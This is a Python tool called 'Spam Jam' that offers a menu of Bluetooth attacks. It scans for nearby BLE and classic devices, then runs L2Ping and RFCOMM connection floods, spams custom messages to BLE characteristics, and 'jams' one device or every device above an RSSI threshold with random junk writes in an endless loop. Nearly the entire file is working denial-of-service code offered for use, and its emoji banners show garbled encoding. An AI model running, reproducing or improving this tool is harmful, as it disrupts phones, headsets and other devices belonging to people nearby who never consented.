import os
import sys
import time
import random
import subprocess
from bluepy.btle import Scanner, Peripheral, DefaultDelegate, ADDR_TYPE_RANDOM, ADDR_TYPE_PUBLIC, BTLEException

# üé® Spam Jam Banner
def print_banner():
    print(r"""
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ñà‚ïó         ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ñà‚ïó
‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ïë         ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ïë
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ñà‚ñà‚ïî‚ñà‚ñà‚ïë         ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ñà‚ñà‚ïî‚ñà‚ñà‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë    ‚ñà‚ñà   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ïö‚ïê‚ïù ‚ñà‚ñà‚ïë    ‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ïö‚ïê‚ïù ‚ñà‚ñà‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïù 
   ‚ù§Ô∏èüíú A WORLD OF BLE FUN üíú‚ù§Ô∏è
   üë©‚Äçüíª Author: ekoms savior
   üéØ Now with MORE Custom Attacks! üéâ
   """)
    print("üíú XOXO HACK THE PLANET! üíú\n")

# üéØ BLE Spamming Class
class BLESpam(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

    def handleNotification(self, cHandle, data):
        print(f"üîî Notification from BLE device: {data}")

# üîé Interactive BLE Scanner
def interactive_ble_scan():
    print("üîé Scanning for BLE devices nearby...")
    scanner = Scanner()
    try:
        devices = scanner.scan(10.0)
        if not devices:
            print("‚ö†Ô∏è No BLE devices found.")
            return []
        for idx, dev in enumerate(devices):
            print(f"üîπ {idx}: {dev.addr} ({dev.addrType}), RSSI={dev.rssi} dB")
        return devices
    except BTLEException as e:
        print(f"‚ö†Ô∏è Scan failed: {e}")
        return []

# üîé Classic Bluetooth Scan with Cute Output + Selection
def scan_classic_devices():
    print("ü§ñ Scanning for Classic Bluetooth devices...")
    try:
        output = subprocess.check_output(["hcitool", "scan"], stderr=subprocess.DEVNULL).decode()
        lines = output.split("\n")[1:]  # Skip the first header line
        results = []
        for idx, line in enumerate(lines):
            parts = line.strip().split("\t")
            if len(parts) >= 2:
                mac = parts[0]
                name = parts[-1]
                print(f"üîπ {idx}: {mac} ‚Äî {name}")
                results.append((mac, name))
        return results
    except Exception as e:
        print(f"‚ö†Ô∏è Classic scan failed: {e}")
        return []

# üéØ Classic RFCOMM Flood Targeted by Scan
def classic_jam():
    devices = scan_classic_devices()
    if not devices:
        return
    try:
        idx = int(input("üíú Enter index of classic device to RFCOMM flood: "))
        target_mac = devices[idx][0]
    except (ValueError, IndexError):
        print("‚ö†Ô∏è Invalid selection.")
        return

    print(f"üí• Starting classic RFCOMM flood on {target_mac}...")
    for i in range(1000):
        try:
            subprocess.run(["rfcomm", "connect", target_mac, "1"], check=True)
            print(f"‚úÖ Attempt {i+1}: Connected to {target_mac}")
        except subprocess.CalledProcessError:
            print(f"‚ö†Ô∏è Attempt {i+1}: Failed to connect to {target_mac}")

# üí• L2Ping Flood
def l2ping_attack():
    devices = interactive_ble_scan()
    if not devices:
        return
    try:
        idx = int(input("üíú Enter index of device to L2Ping: "))
        addr = devices[idx].addr
    except (ValueError, IndexError):
        print("‚ö†Ô∏è Invalid selection.")
        return

    if os.geteuid() != 0:
        print("‚ö†Ô∏è L2Ping needs root! Try: sudo python3 spam_jam.py")
        return

    print(f"üí• Sending L2Ping flood to {addr}")
    try:
        subprocess.run(['l2ping', '-c', '100', '-s', '600', addr], check=True)
        print("‚úÖ L2Ping attack successful!")
    except subprocess.CalledProcessError:
        print(f"‚ö†Ô∏è Failed. Device may be offline.")

# ‚úÖ RFCOMM Flood
def rfcomm_flood():
    devices = interactive_ble_scan()
    if not devices:
        return
    try:
        idx = int(input("üíú Enter index of device for RFCOMM Flood: "))
        addr = devices[idx].addr
    except (ValueError, IndexError):
        print("‚ö†Ô∏è Invalid selection.")
        return

    print(f"üí• Starting RFCOMM flood on {addr}...")
    for i in range(1000):
        try:
            subprocess.run(['rfcomm', 'connect', addr, '1'], check=True)
            print(f"‚úÖ Attempt {i+1}: Connected")
        except subprocess.CalledProcessError:
            print(f"‚ö†Ô∏è Attempt {i+1}: Failed")

# üöÄ Spam Single BLE Device
def spam_ble():
    devices = interactive_ble_scan()
    if not devices:
        return
    try:
        idx = int(input("üíú Enter index of device to spam: "))
        target_mac = devices[idx].addr
    except (ValueError, IndexError):
        print("‚ö†Ô∏è Invalid index.")
        return

    print(f"üöÄ Spamming device {target_mac} üí•üíú")
    custom_message = input("üíú Enter your custom spam message: ").encode()

    try:
        print("üîé Attempting connection with RANDOM address type...")
        peripheral = Peripheral(target_mac, ADDR_TYPE_RANDOM)
    except BTLEException:
        print("‚ö†Ô∏è RANDOM address type failed! Trying PUBLIC address type...")
        try:
            peripheral = Peripheral(target_mac, ADDR_TYPE_PUBLIC)
        except BTLEException as e:
            print(f"‚ùå Failed to connect to {target_mac}. Error: {e}")
            return

    peripheral.setDelegate(BLESpam())
    while True:
        try:
            peripheral.writeCharacteristic(0x0001, custom_message)
            print(f"üíú Spammed: {custom_message.decode(errors='ignore')}")
            time.sleep(0.5)
        except Exception as e:
            print(f"‚ö†Ô∏è Error: {e}")
            break

# üöÄ Spam All BLE Devices
def spam_all_ble():
    devices = interactive_ble_scan()
    if not devices:
        return

    custom_message = input("üíú Enter your spam message for all devices: ").encode()
    for device in devices:
        try:
            print(f"üöÄ Trying to spam {device.addr} üíå")
            peripheral = Peripheral(device.addr, ADDR_TYPE_RANDOM)
            peripheral.setDelegate(BLESpam())
            peripheral.writeCharacteristic(0x0001, custom_message)
            print(f"üíú Spammed {device.addr}")
            peripheral.disconnect()
        except Exception as e:
            print(f"‚ö†Ô∏è Could not spam {device.addr}: {e}")

# üö´ Jam Single BLE Device
def jam_ble():
    print("üîé Resetting BLE scan before jamming...")
    subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    scanner = Scanner()
    try:
        devices = scanner.scan(15.0)
    except BTLEException as e:
        print(f"‚ö†Ô∏è BLE Scan Failed: {e}")
        return

    if not devices:
        print("‚ö†Ô∏è No devices found!")
        return

    for idx, device in enumerate(devices):
        print(f"üîπ {idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")

    try:
        idx = int(input("üíú Enter index of device to jam: "))
        target = devices[idx].addr
    except (ValueError, IndexError):
        print("‚ö†Ô∏è Invalid choice.")
        return

    print(f"üí• Jamming {target} üö´")
    try:
        peripheral = Peripheral(target)
        while True:
            junk = os.urandom(random.randint(20, 50))
            peripheral.writeCharacteristic(0x000b, junk, withResponse=False)
            print(f"üö´ Jammed {target}")
            time.sleep(random.uniform(0.05, 0.2))
    except Exception as e:
        print(f"‚ö†Ô∏è Error: {e}")
        retry = input("üíú Try another? (y/n): ").strip().lower()
        if retry == 'y':
            jam_ble()

# üö´ Jam All BLE Devices ‚Äî AUTO RE-SCAN + RSSI + CLASSIC SCAN
def jam_all_ble():
    print("üîé Starting auto-rejam loop üì°")
    try:
        min_rssi = int(input("üíú Enter minimum RSSI to jam (e.g. -80): "))
    except ValueError:
        min_rssi = -80
        print("‚ö†Ô∏è Invalid input! Defaulting to -80 dB.")

    try:
        while True:
            print("\nüîÅ Scanning for BLE devices to jam...")
            scanner = Scanner()
            try:
                devices = scanner.scan(15.0)
            except BTLEException as e:
                print(f"‚ö†Ô∏è BLE Scan failed: {e}")
                continue

            print("üîç Detected BLE devices:")
            for dev in devices:
                print(f"  ‚Ä¢ {dev.addr} RSSI={dev.rssi} dB")

            jam_targets = [dev for dev in devices if dev.rssi >= min_rssi]

            if not jam_targets:
                print("‚ö†Ô∏è No targets found above threshold. Retrying...")
            else:
                for device in jam_targets:
                    try:
                        print(f"üí• Jamming {device.addr} (RSSI={device.rssi} dB)")
                        peripheral = Peripheral(device.addr)
                        junk = os.urandom(random.randint(20, 50))
                        peripheral.writeCharacteristic(0x000b, junk, withResponse=False)
                        peripheral.disconnect()
                        time.sleep(random.uniform(0.05, 0.2))
                    except Exception as e:
                        print(f"‚ö†Ô∏è Skipped {device.addr}: {e}")

            print("üîÅ Waiting 5 seconds before next scan...")
            time.sleep(5)

            print("ü§ñ Also checking for classic Bluetooth devices...")
            subprocess.run(["hcitool", "scan"])

    except KeyboardInterrupt:
        print("\nüõë Auto re-jam stopped by user.")

# üîé Bluetooth Scanner
def scan_bluetooth():
    print("üîé Scanning for Bluetooth devices...")
    subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        scanner = Scanner()
        devices = scanner.scan(10.0)
        if not devices:
            print("‚ö†Ô∏è No Bluetooth devices found.")
            return
        for idx, d in enumerate(devices):
            print(f"üîπ {idx}: {d.addr} ({d.addrType}), RSSI={d.rssi} dB")
    except BTLEException as e:
        print(f"‚ö†Ô∏è Scan failed: {e}")

# üß† Start Bluetooth Service
def start_bluetooth():
    print("üì° Starting Bluetooth service...")
    subprocess.run(['sudo', 'service', 'bluetooth', 'start'], check=True)
    print("‚úÖ Bluetooth service started!")

# üèÅ Main Menu
def main():
    print_banner()
    while True:
        print("\nüîπ 1Ô∏è‚É£ Spam a BLE device üíå")
        print("üîπ 2Ô∏è‚É£ Jam a BLE device üö´")
        print("üîπ 3Ô∏è‚É£ Scan for Bluetooth devices üì°")
        print("üîπ 4Ô∏è‚É£ L2Ping Attack üí•")
        print("üîπ 5Ô∏è‚É£ RFCOMM Flood üí•")
        print("üîπ 6Ô∏è‚É£ Start Bluetooth Service üì°")
        print("üîπ 7Ô∏è‚É£ Quit üö™")
        print("üîπ 8Ô∏è‚É£ Spam All BLE Devices üíåüí•")
        print("üîπ 9Ô∏è‚É£ Jam All BLE Devices üö´üí•")
        print("üîπ üîü Classic RFCOMM Jam üí£")

        choice = input("üíú Choose an option (1-10): ")
        functions = [spam_ble, jam_ble, scan_bluetooth, l2ping_attack, rfcomm_flood, start_bluetooth, None, spam_all_ble, jam_all_ble, classic_jam]

        if choice == "7":
            print("üëã Goodbye, fren! XOXOXO üíú")
            sys.exit()
        elif choice in map(str, range(1, 11)):
            func = functions[int(choice)-1]
            if func:
                func()
        else:
            print("‚ö†Ô∏è Invalid choice. Try again! üíú")

if __name__ == "__main__":
    main()
